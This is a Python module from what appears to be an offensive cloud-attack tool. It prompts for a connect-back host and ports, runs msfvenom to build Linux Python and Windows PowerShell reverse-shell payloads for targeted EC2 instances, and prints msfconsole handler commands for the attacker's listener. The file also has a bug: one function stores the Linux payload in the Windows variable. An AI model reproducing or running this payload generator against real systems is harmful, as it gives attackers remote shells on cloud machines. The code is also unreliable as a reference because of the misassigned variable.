import os

from clint.textui import prompt

from src.constants.platforms import PlatformTypes
from src.helpers.print_output import print_color
from src.scanner.platform_mapping import PLATFORM_MAPPING


def get_all_metasploit_installed_options(
        linux: bool, windows: bool, host: str, port: str, port_windows: str,
        auto: bool = False) -> (list[str], list[str]):
    """
    Prompts for metasploit  options against a range of EC2 instances depending on their OS.
    :param linux: Whether there are any targeted instances running Linux.
    :param windows: Whether there are any targeted instances running Windows.
    :param host: Remote hostname
    :param port: Remote port for linux
    :param port_windows: Remote port for windows
    :param auto: set all automatically
    :return: Tuple of metasploit payloads for linux and windows.
    """
    print_color('[*] Metasploit payloads. This requires msfvenom to be installed in your system.')
    linux_attacks = []
    windows_attacks = []
    if not auto:
        host = prompt.query('Your remote IP or hostname to connect back to:', default=host)
    if linux:
        handler = PLATFORM_MAPPING[PlatformTypes.LINUX]
        for option in handler.metasploit_options:
            if not auto:
                port = prompt.query(
                    "Your remote port number (Listener ports should be different for linux and windows):", default=port)
            linux_attacks.append(get_metasploit_payload_data(
                linux=True,
                payload=option['return'],
                host=host,
                port=port,
            ))
    if windows:
        handler = PLATFORM_MAPPING[PlatformTypes.WINDOWS]
        for option in handler.metasploit_options:
            if not auto:
                port_windows = prompt.query(
                    "Your remote port number (Listener ports should be different for linux and windows):",
                    default=port_windows)
            windows_attacks.append(get_metasploit_payload_data(
                windows=True,
                payload=option['return'],
                host=host,
                port_windows=port_windows,
            ))

    return linux_attacks, windows_attacks


def metasploit_installed_multiple_options(
        linux: bool, windows: bool, host: str, port: str, port_windows: str) -> (str, str):
    """
    Prompts for metasploit  options against a range of EC2 instances depending on their OS.
    :param linux: Whether there are any targeted instances running Linux.
    :param windows: Whether there are any targeted instances running Windows.
    :param host: Remote hostname
    :param port: Remote port for linux
    :param port_windows: Remote port for windows
    :return: Tuple of metasploit payloads for linux and windows.
    """
    print_color('[*] Choose your metasploit payload. This requires msfvenom to be installed in your system.')
    linux_attack = ''
    windows_attack = ''

    if linux:
        handler = PLATFORM_MAPPING[PlatformTypes.LINUX]
        payload = prompt.options('Payload for Linux EC2 instances:', handler.metasploit_options)
        host = prompt.query('Your remote IP or hostname to connect back to:', default=host)
        port = prompt.query(
            "Your remote port number (Listener ports should be different for linux and windows):", default=port)
        windows_attack = get_metasploit_payload_data(
            linux=True,
            payload=payload,
            host=host,
            port=port,
        )
    if windows:
        handler = PLATFORM_MAPPING[PlatformTypes.WINDOWS]
        payload = prompt.options(
            'Payload for Windows EC2 instances:', handler.metasploit_options)
        host = prompt.query('Your remote IP or hostname to connect back to:', default=host)
        port_windows = prompt.query(
            "Your remote port number (Listener ports should be different for linux and windows):", default=port_windows)
        windows_attack = get_metasploit_payload_data(
            windows=True,
            payload=payload,
            host=host,
            port_windows=port_windows,
        )

    return linux_attack, windows_attack


def get_metasploit_payload_data(
        payload: str, host: str,
        linux: bool = False, windows: bool = False,
        port: str = '4444', port_windows: str = '5555') -> str:
    if linux:
        linux_msf_shell = (f'msfvenom -a python --platform python -p {payload} LHOST={host} LPORT={port} '
                           f'-f raw --smallest')
        print_color('[*] Run the following command on your remote listening server to run the linux payload handler:')
        msfconsole_cmd = (f"msfconsole -x 'use exploit/multi/handler; set LHOST {host}; "
                          f"set lport {port}; "
                          f"set payload {payload};run -j;'")
        print_color(msfconsole_cmd, 'magenta')
        return f"python -c \"{os.popen(linux_msf_shell).read()}\""
    if windows:
        windows_msf_shell = ('msfvenom -a x64 --platform Windows -p '
                             f'{payload} LHOST={host} LPORT={port_windows} --f psh-net --smallest')
        print_color(
            '[*] Run the following command on your remote listening server to run the windows payload handler:')
        msfconsole_cmd = (f"msfconsole -x 'use exploit/multi/handler; set LHOST {host};"
                          f" set lport {port_windows}; set payload {payload};run -j;'")
        print_color(msfconsole_cmd, 'magenta')
        return os.popen(windows_msf_shell).read()
